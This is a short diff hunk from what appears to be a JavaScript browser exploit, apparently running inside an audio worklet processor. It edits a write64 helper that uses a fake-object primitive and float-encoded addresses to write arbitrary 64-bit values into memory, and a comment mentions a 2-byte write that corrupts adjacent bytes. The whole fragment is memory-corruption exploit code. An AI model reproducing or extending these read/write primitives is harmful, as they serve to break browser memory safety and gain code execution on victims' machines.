@@ -365,7 +365,7 @@ b.process = (inputs, outputs, parameters)=>{
         // Write an int64 to the given address.
         write64(addr, int64) {
             hax[1] = qwordAsFloat(addr+0x10);
-            victim.prop = this.fakeobj(int64);
+            victim.prop = fakeObj(int64);
         },
 
         // Write a 2 byte integer to the given address. Corrupts 6 additional bytes after the written integer.
